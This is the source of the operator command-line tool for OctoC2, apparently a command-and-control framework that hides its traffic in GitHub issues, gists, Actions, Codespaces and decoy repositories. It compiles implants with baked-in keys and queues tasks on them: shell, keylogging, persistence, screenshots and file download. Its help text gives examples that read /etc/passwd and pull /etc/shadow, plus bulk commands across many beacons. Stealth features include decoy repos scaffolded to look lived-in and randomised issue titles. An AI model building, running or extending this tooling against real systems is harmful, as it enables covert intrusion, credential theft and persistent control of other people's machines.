#!/usr/bin/env bun
/**
 * octoctl — OctoC2 Operator CLI
 *
 * Commands:
 *   keygen                         — generate operator X25519 key pair
 *   beacons                        — list registered beacons
 *   task <beaconId> --kind <kind>  — queue a task for a beacon
 *   results <beaconId>             — show decrypted task results
 *   module build <name>            — compile and upload a module binary
 *   build-beacon                   — compile implant with baked keypair
 *   drop create                    — create encrypted dead-drop gist
 *   drop list                      — search for existing dead-drops
 *   proxy create <owner/repo>      — print proxy repo workflow templates
 *   proxy list                     — show configured proxy repos
 *   proxy rotate <beaconId> <json> — print dead-drop payload for proxy rotation
 *
 * Environment (all commands except keygen):
 *   OCTOC2_GITHUB_TOKEN   — GitHub PAT (repo scope)
 *   OCTOC2_REPO_OWNER     — org/user owning the C2 repo
 *   OCTOC2_REPO_NAME      — C2 repository name
 *   OCTOC2_OPERATOR_SECRET — base64url X25519 secret key
 *   MONITORING_PUBKEY — base64url X25519 public key (or GitHub Variable)
 *   OCTOC2_DATA_DIR       — server data directory (default: ./data)
 */

import { Command } from "commander";
import { runKeygen }  from "./commands/keygen.ts";
import { runBeacons } from "./commands/beacons.ts";
import { runTask, type TaskKind }    from "./commands/task.ts";
import { runResults } from "./commands/results.ts";
import { runModuleBuild } from "./commands/module.ts";
import { runBuildBeacon, type BuildBeaconOptions } from "./commands/buildBeacon.ts";
import { runBuildBeaconSimple } from "./commands/buildBeaconSimple.ts";
import { runDropCreate, runDropList }               from "./commands/drop.ts";
import { proxyCreate, proxyList, proxyRotate, proxyProvision } from "./commands/proxy.ts";
import { runTentaclesList, runTentaclesHealth } from "./commands/tentacles.ts";
import { runBeaconShell }  from "./commands/beaconShell.ts";
import { runBulkShell }    from "./commands/bulkShell.ts";
import { runSetup }        from "./commands/setup.ts";
import { runStart, runStop, runStatus } from "./commands/service.ts";

const program = new Command();

program
  .name("octoctl")
  .description("OctoC2 operator CLI")
  .version("0.1.0")
  .addHelpText("after", `
Environment variables:
  OCTOC2_GITHUB_TOKEN    GitHub PAT with repo scope
  OCTOC2_REPO_OWNER      org/user owning the C2 repo
  OCTOC2_REPO_NAME       C2 repository name
  OCTOC2_OPERATOR_SECRET base64url X25519 secret key (server + octoctl, keep secret)
  MONITORING_PUBKEY base64url X25519 public key (or set as GitHub repo Variable)
  OCTOC2_DATA_DIR        server data directory (default: ./data)
`);

// ── keygen ────────────────────────────────────────────────────────────────────

program
  .command("keygen")
  .description("Generate a new operator X25519 key pair")
  .option(
    "--set-variable",
    "also push the public key to the MONITORING_PUBKEY GitHub repo variable",
    false
  )
  .action(async (opts: { setVariable: boolean }) => {
    await runKeygen({ setVariable: opts.setVariable }).catch(fatal);
  });

// ── beacons ───────────────────────────────────────────────────────────────────

program
  .command("beacons")
  .description("List registered beacons from the server registry")
  .option("--json",             "output raw JSON",    false)
  .option("--status <status>",  "filter by status: active | dormant | lost")
  .option("--data-dir <dir>",   "server data directory (overrides OCTOC2_DATA_DIR)")
  .action(async (opts: { json: boolean; status?: string; dataDir?: string }) => {
    await runBeacons({
      json:    opts.json,
      status:  opts.status as "active" | "dormant" | "lost" | undefined,
      dataDir: opts.dataDir,
    }).catch(fatal);
  });

// ── task ──────────────────────────────────────────────────────────────────────

program
  .command("task <beaconId>")
  .description("Queue a task for a beacon (posts encrypted deploy comment to GitHub)")
  .requiredOption("--kind <kind>",       "task kind: shell|upload|download|screenshot|keylog|persist|unpersist|sleep|die|load-module")
  .option("--cmd <cmd>",                 "shell command to execute  (kind=shell)")
  .option("--local-path <path>",         "local file path           (kind=upload)")
  .option("--remote-path <path>",        "remote file path          (kind=download|upload)")
  .option("--seconds <n>",               "sleep duration in seconds (kind=sleep)")
  .option("--args-json <json>",          "raw task args as JSON string (advanced)")
  .option("--tentacle <kind>",           "force delivery via specific channel: issues|branch|actions|proxy|codespaces|relay|gist|oidc|notes|secrets|pages|stego")
  .addHelpText("after", `
Examples:
  octoctl task abc123 --kind shell --cmd "id"
  octoctl task abc123 --kind shell --cmd "cat /etc/passwd"
  octoctl task abc123 --kind download --remote-path /etc/shadow
  octoctl task abc123 --kind sleep --seconds 300
  octoctl task abc123 --kind die
  octoctl task abc123 --kind shell --cmd "whoami" --tentacle notes
  octoctl task abc123 --kind shell --cmd "id" --tentacle gist
`)
  .action(async (
    beaconId: string,
    opts: {
      kind:        string;
      cmd?:        string;
      localPath?:  string;
      remotePath?: string;
      seconds?:    string;
      argsJson?:   string;
      tentacle?:   string;
    }
  ) => {
    await runTask(beaconId, {
      kind:       opts.kind as TaskKind,
      cmd:        opts.cmd,
      localPath:  opts.localPath,
      remotePath: opts.remotePath,
      seconds:    opts.seconds !== undefined ? parseInt(opts.seconds, 10) : undefined,
      argsJson:   opts.argsJson,
      tentacle:   opts.tentacle,
    }).catch(fatal);
  });

// ── results ───────────────────────────────────────────────────────────────────

program
  .command("results <beaconId>")
  .description("Fetch and decrypt task results from a beacon's GitHub issue")
  .option("--last <n>",       "show last N results")
  .option("--since <time>",   "time window: 30m | 2h | 1d | ISO-8601 (default: 24h)")
  .option("--json",           "output raw JSON", false)
  .addHelpText("after", `
Examples:
  octoctl results abc123
  octoctl results abc123 --last 5
  octoctl results abc123 --since 2h
  octoctl results abc123 --json
`)
  .action(async (
    beaconId: string,
    opts: { last?: string; since?: string; json: boolean }
  ) => {
    await runResults(beaconId, {
      last:  opts.last !== undefined ? parseInt(opts.last, 10) : undefined,
      since: opts.since,
      json:  opts.json,
    }).catch(fatal);
  });

// ── module ────────────────────────────────────────────────────────────────────

const moduleCmd = program
  .command("module")
  .description("Manage OctoModules — per-beacon compiled capability binaries");

moduleCmd
  .command("build <name>")
  .description("Compile and upload a module binary for a specific beacon")
  .requiredOption("--beacon <beaconId>",  "target beacon ID (prefix match)")
  .requiredOption("--source <path>",      "path to the Bun source file to compile")
  .option("--server-url <url>",           "C2 server URL (overrides OCTOC2_SERVER_URL)")
  .addHelpText("after", `
Examples:
  # Recon module — collects hostname, whoami, uname
  octoctl module build recon --beacon abc123 --source ./modules/recon.ts --server-url https://myserver:8080

  # Screenshot stub (not yet implemented)
  octoctl module build screenshot --beacon abc123 --source ./modules/screenshot.ts --server-url https://myserver:8080

  # Persist stub (not yet implemented)
  octoctl module build persist --beacon abc123 --source ./modules/persist.ts --server-url https://myserver:8080

  # Using OCTOC2_SERVER_URL env var instead of --server-url
  OCTOC2_SERVER_URL=https://myserver:8080 octoctl module build recon --beacon abc123 --source ./modules/recon.ts

After building, queue the module for execution on the beacon:
  octoctl task abc123 --kind load-module --args-json '{"name":"recon","serverUrl":"https://myserver:8080"}'
`)
  .action(async (
    name: string,
    opts: { beacon: string; source: string; serverUrl?: string }
  ) => {
    await runModuleBuild(name, {
      beacon:    opts.beacon,
      source:    opts.source,
      serverUrl: opts.serverUrl,
    }).catch(fatal);
  });

// ── build-beacon ──────────────────────────────────────────────────────────────

program
  .command("build-beacon")
  .description("Compile implant binary with baked-in X25519 keypair and beacon ID")
  .option("-o, --output <path>",         "output binary path (simple mode; alias for --outfile)")
  .option("--outfile <path>",            "output binary path (full mode)")
  .option("-p, --platform <platform>",   "bun platform target (simple mode, default: linux-x64)")
  .option("--beacon-id <uuid>",          "pre-assigned beacon UUID (generated if omitted)")
  .option("--source <path>",             "implant entry point", "./implant/src/index.ts")
  .option("--relay <account/repo>",      "relay consortium entry (repeatable)", (v: string, acc: string[]) => [...acc, v], [] as string[])
  .option("--target <target>",           "bun compile target (full mode, default: bun-linux-x64)")
  .option("--no-random-title",           "disable random issue title (uses default format)")
  .option("--app-id <n>",                "bake GitHub App ID as SVC_APP_ID (not secret)")
  .option("--installation-id <n>",       "bake installation ID as SVC_INSTALLATION_ID")
  .option("--codespace-name <name>",     "bake Codespace name (SVC_GRPC_CODESPACE_NAME) — enables stealth gRPC bootstrap")
  .option("--github-user <user>",        "bake GitHub username for Codespace SSH auth (SVC_GITHUB_USER)")
  .option("--tentacle-priority <list>",  "bake tentacle priority order (SVC_TENTACLE_PRIORITY), e.g. codespaces,issues")
  .option("--grpc-url <url>",            "bake public gRPC URL (SVC_GRPC_DIRECT), e.g. https://name-50051.app.github.dev")
  .option("--http-url <url>",            "base HTTP URL to bake in (SVC_HTTP_URL). e.g. https://codespace-8080.app.github.dev")
  .addHelpText("after", `
Examples:
  # Simple mode (just compile, no key baking):
  octoctl build-beacon --output ./beacon
  octoctl build-beacon --output /tmp/svc-beacon-smoke --platform linux-x64
  # Full mode (baked keypair + beacon ID):
  octoctl build-beacon --outfile ./implant-abc123
  octoctl build-beacon --outfile ./implant-abc123 --relay relay1/relay-repo --relay relay2/relay-repo2
  octoctl build-beacon --outfile ./implant-abc123 --no-random-title
  # Bake App ID + installation ID; deliver private key separately via dead-drop
  octoctl build-beacon --outfile ./implant-abc123 --app-id 123456 --installation-id 987654
  # Bake public Codespace gRPC URL — beacon skips GitHub Issues entirely
  octoctl build-beacon --outfile ./implant-abc123 --grpc-url https://name-50051.app.github.dev --tentacle-priority codespaces,issues
`)
  .action(async (opts: {
    output?: string; outfile?: string; platform?: string;
    beaconId?: string; source: string; relay: string[];
    target?: string; randomTitle: boolean; appId?: string; installationId?: string;
    codespaceName?: string; githubUser?: string; tentaclePriority?: string; grpcUrl?: string; httpUrl?: string;
  }) => {
    // Simple mode: --output (or --output + --platform) — no key baking, just bun build
    if (opts.output !== undefined) {
      runBuildBeaconSimple({
        output:   opts.output,
        platform: opts.platform ?? "linux-x64",
      });
      return;
    }

    // Full mode: --outfile required
    if (!opts.outfile) {
      console.error("\n  Error: --outfile <path> is required (or use --output for simple mode)\n");
      process.exit(1);
    }

    // Env-var fallbacks — App tokens used by default when env vars set
    const appId          = opts.appId          ?? process.env["SVC_APP_ID"];
    const installationId = opts.installationId  ?? process.env["SVC_INSTALLATION_ID"];
    await runBuildBeacon({
      outfile: opts.outfile,
      ...(opts.beaconId    !== undefined && { beaconId:    opts.beaconId }),
      source:  opts.source,
      relay:   opts.relay,
      target:  opts.target ?? "bun-linux-x64",
      randomTitle: opts.randomTitle,
      ...(appId          !== undefined && { appId:          parseInt(appId, 10) }),
      ...(installationId !== undefined && { installationId: parseInt(installationId, 10) }),
      ...(opts.codespaceName    !== undefined && { codespaceName:    opts.codespaceName }),
      ...(opts.githubUser       !== undefined && { githubUser:       opts.githubUser }),
      ...(opts.tentaclePriority !== undefined && { tentaclePriority: opts.tentaclePriority }),
      ...(opts.grpcUrl          !== undefined && { grpcUrl:          opts.grpcUrl }),
      ...(opts.httpUrl          !== undefined && { httpUrl:          opts.httpUrl }),
    }).catch(fatal);
  });

// ── drop ──────────────────────────────────────────────────────────────────────

const dropCmd = program
  .command("drop")
  .description("Manage cryptographic dead-drops for beacon recovery");

dropCmd
  .command("create")
  .description("Create an encrypted dead-drop gist for a beacon")
  .requiredOption("--beacon <id-prefix>",      "target beacon ID (prefix match)")
  .option("--server-url <url>",                "new C2 server URL to bake into drop")
  .option("--new-token <pat>",                 "replacement GitHub PAT (if rotating token)")
  .option("--tentacle-priority <p1,p2,...>",   "new tentacle priority (e.g. notes,issues)")
  .option("--app-id <n>",                      "GitHub App ID (numeric) — include to migrate beacon to App auth")
  .option("--installation-id <n>",             "GitHub App installation ID for the C2 repo")
  .option("--app-key-file <path>",             "path to GitHub App private key PEM (for App auth rotation)")
  .option("--key-type <type>",                 "key type: 'app' (GitHub App PEM) or 'monitoring' (operator pubkey rotation)")
  .option("--monitoring-pubkey <pubkey>",      "new operator public key (base64url) for monitoring key rotation")
  .option("--data-dir <dir>",                  "server data directory (overrides OCTOC2_DATA_DIR)")
  .addHelpText("after", `
Examples:
  octoctl drop create --beacon abc123 --server-url https://backup-c2:8080
  octoctl drop create --beacon abc123 --server-url https://backup-c2:8080 --tentacle-priority notes,issues
  # Rotate App private key without changing C2 URL:
  octoctl drop create --beacon abc123 --app-key-file ~/.config/svc/new-app-key.pem
  # Migrate running beacon from PAT → GitHub App auth:
  octoctl drop create --beacon abc123 --app-id 123456 --installation-id 987654 --app-key-file ~/.config/svc/app-key.pem
  # Rotate operator monitoring pubkey (X25519):
  octoctl drop create --beacon abc123 --key-type monitoring --monitoring-pubkey <base64url-pubkey>
  # Explicit app key rotation with --key-type:
  octoctl drop create --beacon abc123 --key-type app --app-key-file ~/.config/svc/new-app-key.pem
`)
  .action(async (opts: {
    beacon: string; serverUrl?: string; newToken?: string;
    tentaclePriority?: string; appId?: string; installationId?: string;
    appKeyFile?: string; keyType?: string; monitoringPubkey?: string; dataDir?: string;
  }) => {
    await runDropCreate({
      beacon: opts.beacon,
      ...(opts.serverUrl        !== undefined && { serverUrl:        opts.serverUrl }),
      ...(opts.newToken         !== undefined && { newToken:         opts.newToken }),
      ...(opts.tentaclePriority !== undefined && { tentaclePriority: opts.tentaclePriority }),
      ...(opts.appId            !== undefined && { appId:            parseInt(opts.appId, 10) }),
      ...(opts.installationId   !== undefined && { installationId:   parseInt(opts.installationId, 10) }),
      ...(opts.appKeyFile       !== undefined && { appKeyFile:       opts.appKeyFile }),
      ...(opts.keyType          !== undefined && { keyType:          opts.keyType as 'app' | 'monitoring' }),
      ...(opts.monitoringPubkey !== undefined && { monitoringPubkey: opts.monitoringPubkey }),
      ...(opts.dataDir          !== undefined && { dataDir:          opts.dataDir }),
    }).catch(fatal);
  });

dropCmd
  .command("list")
  .description("Search GitHub for existing dead-drops for a beacon")
  .requiredOption("--beacon <id-prefix>", "target beacon ID (prefix match)")
  .option("--data-dir <dir>",             "server data directory (overrides OCTOC2_DATA_DIR)")
  .action(async (opts: { beacon: string; dataDir?: string }) => {
    await runDropList({
      beacon: opts.beacon,
      ...(opts.dataDir !== undefined && { dataDir: opts.dataDir }),
    }).catch(fatal);
  });

// ── proxy ─────────────────────────────────────────────────────────────────────

const proxyCmd = program
  .command("proxy")
  .description("Manage OctoProxy — GitHub Actions relay repos for beacon checkins");

proxyCmd
  .command("create")
  .description("Provision a decoy repo as an OctoProxy relay for a beacon")
  .requiredOption("--decoy-repo <owner/repo>",  "decoy repository (owner/repo)")
  .requiredOption("--beacon <id>",              "beacon ID (prefix match)")
  .requiredOption("--ctrl-token <pat>",         "PAT with actions:write on the control repo")
  .option("--ctrl-owner <owner>",               "control repo owner (default: OCTOC2_CTRL_OWNER env)")
  .option("--ctrl-repo <name>",                 "control repo name (default: OCTOC2_CTRL_REPO env)")
  .option("--proxy-token <pat>",                "restricted PAT for beacon use on decoy repo")
  .option("--inner-kind <kind>",                "issues | notes (default: issues)", "issues")
  .option("--issue-title <text>",               "title for the proxy issue", "Dependency audit: review pinned versions")
  .option("--create-repo",                      "create the decoy GitHub repo first", false)
  .option("--scaffold",                         "add README + .gitignore to make repo look lived-in", false)
  .option("--data-dir <dir>",                   "server data directory (overrides OCTOC2_DATA_DIR)")
  .option("--app-id <id>",                      "GitHub App ID for beacon proxy auth")
  .option("--installation-id <id>",             "GitHub App installation ID for beacon proxy auth")
  .option("--app-private-key <pem>",            "GitHub App private key (PEM) for beacon proxy auth")
  .addHelpText("after", `
Examples:
  octoctl proxy create --decoy-repo acme/infra-utils --beacon abc123 --ctrl-token github_pat_...
  octoctl proxy create --decoy-repo acme/infra-utils --beacon abc123 --ctrl-token github_pat_... --create-repo --scaffold
`)
  .action(async (opts: {
    decoyRepo: string; beacon: string; ctrlToken: string;
    ctrlOwner?: string; ctrlRepo?: string; proxyToken?: string;
    innerKind: string; issueTitle: string; createRepo: boolean;
    scaffold: boolean; dataDir?: string;
    appId?: string; installationId?: string; appPrivateKey?: string;
  }) => {
    const [decoyOwner, decoyRepoName] = opts.decoyRepo.split("/");
    if (!decoyOwner || !decoyRepoName) {
      console.error(`\n  Error: --decoy-repo must be in owner/repo format, got '${opts.decoyRepo}'\n`);
      process.exit(1);
    }
    const ctrlOwner = opts.ctrlOwner ?? process.env["OCTOC2_CTRL_OWNER"];
    const ctrlRepo  = opts.ctrlRepo  ?? process.env["OCTOC2_CTRL_REPO"];
    if (!ctrlOwner) { console.error("\n  Error: --ctrl-owner or OCTOC2_CTRL_OWNER required\n"); process.exit(1); }
    if (!ctrlRepo)  { console.error("\n  Error: --ctrl-repo or OCTOC2_CTRL_REPO required\n");  process.exit(1); }
    // Env-var fallbacks — App tokens used by default when env vars set
    const appId         = opts.appId         ?? process.env["SVC_APP_ID"];
    const installationId = opts.installationId ?? process.env["SVC_INSTALLATION_ID"];
    const appPrivateKey  = opts.appPrivateKey  ?? process.env["OCTOC2_APP_PRIVATE_KEY"];
    await proxyProvision({
      decoyOwner, decoyRepo: decoyRepoName,
      beaconId:  opts.beacon,
      ctrlToken: opts.ctrlToken, ctrlOwner, ctrlRepo,
      ...(opts.proxyToken && { proxyToken: opts.proxyToken }),
      innerKind:  opts.innerKind as "issues" | "notes",
      issueTitle: opts.issueTitle,
      createRepo: opts.createRepo,
      scaffold:   opts.scaffold,
      ...(opts.dataDir && { dataDir: opts.dataDir }),
      ...(appId && installationId && appPrivateKey && {
        appId,
        installationId,
        appPrivateKey,
      }),
    }).catch(fatal);
  });

proxyCmd
  .command("templates")
  .description("Print the OctoProxy workflow YAML templates (for manual setup)")
  .option("--inner-kind <kind>", "issues | notes", "issues")
  .action(async (opts: { innerKind: string }) => {
    await proxyCreate({
      owner: "your-org", repo: "your-decoy-repo",
      innerKind: opts.innerKind as "issues" | "notes"
    }).catch(fatal);
  });

proxyCmd
  .command("list")
  .description("Show proxy repos configured via SVC_PROXY_REPOS env var")
  .action(async () => {
    await proxyList().catch(fatal);
  });

proxyCmd
  .command("rotate <beaconId> <newProxyRepos>")
  .description("Print a dead-drop payload to update proxy repos for a beacon")
  .addHelpText("after", `
Examples:
  octoctl proxy rotate abc123 '[{"owner":"acme","repo":"decoy","innerKind":"issues"}]'
`)
  .action(async (beaconId: string, newProxyRepos: string) => {
    await proxyRotate({ beaconId, newProxyRepos }).catch(fatal);
  });

// ── beacon ────────────────────────────────────────────────────────────────────

const beaconCmd = program
  .command("beacon")
  .description("Beacon management commands");

beaconCmd
  .command("shell")
  .description("Interactive shell session over the C2 server HTTP API")
  .requiredOption("--beacon <id>",       "beacon ID (prefix match)")
  .option("--tentacle <kind>",           "force delivery via specific channel")
  .option("--server-url <url>",          "C2 server URL (overrides OCTOC2_SERVER_URL)")
  .option("--timeout <seconds>",         "max wait per command in seconds", "300")
  .addHelpText("after", `
Examples:
  OCTOC2_SERVER_URL=http://localhost:8080 octoctl beacon shell --beacon abc123
  OCTOC2_SERVER_URL=http://localhost:8080 octoctl beacon shell --beacon abc123 --tentacle notes
`)
  .action(async (opts: { beacon: string; tentacle?: string; serverUrl?: string; timeout?: string }) => {
    await runBeaconShell({
      beacon: opts.beacon,
      ...(opts.tentacle   !== undefined && { tentacle:   opts.tentacle }),
      ...(opts.serverUrl  !== undefined && { serverUrl:  opts.serverUrl }),
      ...(opts.timeout    !== undefined && { timeout:    parseInt(opts.timeout, 10) }),
    }).catch(fatal);
  });

// ── tentacles ─────────────────────────────────────────────────────────────────

const tentaclesCmd = program
  .command("tentacles")
  .description("Inspect tentacle (channel) health for registered beacons");

tentaclesCmd
  .command("list")
  .description("Show tentacle health status for all channels on a beacon")
  .requiredOption("--beacon <id>",      "beacon ID (prefix match)")
  .option("--json",                     "output raw JSON", false)
  .option("-v, --verbose",              "show full last-error details section", false)
  .option("--server-url <url>",         "C2 server URL — enables live data (overrides offline registry)")
  .option("--data-dir <dir>",           "server data directory (overrides OCTOC2_DATA_DIR)")
  .addHelpText("after", `
Examples:
  octoctl tentacles list --beacon abc123
  octoctl tentacles list --beacon abc123 --json
  octoctl tentacles list --beacon abc123 --server-url http://localhost:8080
  octoctl tentacles list --beacon abc123 --verbose
`)
  .action(async (opts: { beacon: string; json: boolean; verbose: boolean; serverUrl?: string; dataDir?: string }) => {
    await runTentaclesList({
      beacon:    opts.beacon,
      json:      opts.json,
      verbose:   opts.verbose,
      ...(opts.serverUrl !== undefined && { serverUrl: opts.serverUrl }),
      ...(opts.dataDir   !== undefined && { dataDir:   opts.dataDir }),
    }).catch(fatal);
  });

tentaclesCmd
  .command("health")
  .description("Real-time tentacle health status (alias for 'tentacles list')")
  .requiredOption("--beacon <id>",      "beacon ID (prefix match)")
  .option("--json",                     "output raw JSON", false)
  .option("-v, --verbose",              "show full last-error details section", false)
  .option("--server-url <url>",         "C2 server URL — enables live data (overrides offline registry)")
  .option("--data-dir <dir>",           "server data directory (overrides OCTOC2_DATA_DIR)")
  .addHelpText("after", `
Examples:
  octoctl tentacles health --beacon abc123
  octoctl tentacles health --beacon abc123 --json
  octoctl tentacles health --beacon abc123 --server-url http://localhost:8080
  octoctl tentacles health --beacon abc123 --verbose
`)
  .action(async (opts: { beacon: string; json: boolean; verbose: boolean; serverUrl?: string; dataDir?: string }) => {
    await runTentaclesHealth({
      beacon:    opts.beacon,
      json:      opts.json,
      verbose:   opts.verbose,
      ...(opts.serverUrl !== undefined && { serverUrl: opts.serverUrl }),
      ...(opts.dataDir   !== undefined && { dataDir:   opts.dataDir }),
    }).catch(fatal);
  });

// ── bulk ──────────────────────────────────────────────────────────────────────

const bulkCmd = program
  .command("bulk")
  .description("Bulk operator commands — target multiple beacons at once");

bulkCmd
  .command("shell")
  .description("Queue a shell command on multiple beacons simultaneously (fire-and-forget)")
  .requiredOption("--beacon-ids <ids>",  "comma-separated beacon IDs")
  .requiredOption("--cmd <command>",     "shell command to queue on each beacon")
  .option("--server-url <url>",          "C2 server URL (overrides OCTOC2_SERVER_URL)")
  .option("--token <token>",             "bearer token (overrides OCTOC2_DASHBOARD_TOKEN)")
  .option("--json",                      "output raw JSON", false)
  .option("--wait",                      "poll each beacon for results after queueing", false)
  .option("--timeout <seconds>",         "seconds to wait for results when --wait is set (default 60)", "60")
  .addHelpText("after", `
Examples:
  octoctl bulk shell --beacon-ids abc123,def456,ghi789 --cmd "whoami"
  OCTOC2_SERVER_URL=http://localhost:8080 octoctl bulk shell --beacon-ids abc123,def456 --cmd "id" --json
  octoctl bulk shell --beacon-ids abc123,def456 --cmd "id" --wait
  octoctl bulk shell --beacon-ids abc123,def456 --cmd "id" --wait --timeout 120
`)
  .action(async (opts: {
    beaconIds:  string;
    cmd:        string;
    serverUrl?: string;
    token?:     string;
    json:       boolean;
    wait:       boolean;
    timeout:    string;
  }) => {
    await runBulkShell({
      beaconIds:   opts.beaconIds,
      cmd:         opts.cmd,
      ...(opts.serverUrl !== undefined && { serverUrl: opts.serverUrl }),
      ...(opts.token     !== undefined && { token:     opts.token }),
      json:        opts.json,
      wait:        opts.wait,
      pollTimeout: parseInt(opts.timeout, 10),
    }).catch(fatal);
  });

// ── setup (interactive wizard) ───────────────────────────────────────────────

program
  .command("setup")
  .description("Interactive setup wizard — configure C2 deployment from scratch")
  .option("--phase <phase>", "run a single phase: credentials | validate | keygen | auth | tentacles | env | build | verify")
  .action(async (opts: { phase?: string }) => {
    await runSetup(opts).catch(fatal);
  });

// ── start ────────────────────────────────────────────────────────────────────

program
  .command("start")
  .description("Start the C2 server and/or dashboard as background processes")
  .argument("[component]", "server | dashboard (default: both)")
  .option("--env <path>", "path to .env file", ".env")
  .action(async (component: string | undefined, opts: { env: string }) => {
    const valid = ["server", "dashboard", undefined];
    if (!valid.includes(component)) {
      console.error(`\n  Error: unknown component '${component}' — use server or dashboard\n`);
      process.exit(1);
    }
    await runStart({ component: component as any, env: opts.env }).catch(fatal);
  });

// ── stop ─────────────────────────────────────────────────────────────────────

program
  .command("stop")
  .description("Stop running server and/or dashboard")
  .argument("[component]", "server | dashboard (default: both)")
  .action(async (component: string | undefined) => {
    const valid = ["server", "dashboard", undefined];
    if (!valid.includes(component)) {
      console.error(`\n  Error: unknown component '${component}' — use server or dashboard\n`);
      process.exit(1);
    }
    await runStop({ component: component as any }).catch(fatal);
  });

// ── status ───────────────────────────────────────────────────────────────────

program
  .command("status")
  .description("Show running OctoC2 components")
  .action(async () => {
    await runStatus().catch(fatal);
  });

// ── update ───────────────────────────────────────────────────────────────────

program
  .command("update")
  .description("Pull latest OctoC2 from the repo and reinstall dependencies")
  .option("--branch <branch>", "branch to pull from", "main")
  .action(async (opts: { branch: string }) => {
    const { resolve } = await import("node:path");

    // Find project root — walk up from octoctl/ or use cwd
    let root = process.cwd();
    const { existsSync } = await import("node:fs");
    if (existsSync(resolve(root, "octoctl", "package.json"))) {
      // already at root
    } else if (existsSync(resolve(root, "..", "octoctl", "package.json"))) {
      root = resolve(root, "..");
    }

    const bunBin = Bun.which("bun") ?? `${process.env.HOME}/.bun/bin/bun`;

    console.log(`\n  Updating OctoC2 from ${opts.branch}…\n`);

    // 1. git pull
    const pull = Bun.spawn(["git", "pull", "origin", opts.branch], {
      cwd: root, stdout: "inherit", stderr: "inherit",
    });
    if ((await pull.exited) !== 0) {
      console.error(`\n  git pull failed.\n`);
      process.exit(1);
    }

    // 2. bun install
    console.log(`\n  Installing dependencies…\n`);
    const install = Bun.spawn([bunBin, "install"], {
      cwd: root, stdout: "inherit", stderr: "inherit",
    });
    if ((await install.exited) !== 0) {
      console.error(`\n  bun install failed.\n`);
      process.exit(1);
    }

    console.log(`\n  \x1b[32m✓\x1b[0m OctoC2 updated.\n`);
  });

// ── Error handler ─────────────────────────────────────────────────────────────

function fatal(err: unknown): never {
  const msg = err instanceof Error ? err.message : String(err);
  console.error(`\n  Error: ${msg}\n`);
  process.exit(1);
}

// ── Parse ─────────────────────────────────────────────────────────────────────

program.parseAsync(process.argv).catch(fatal);
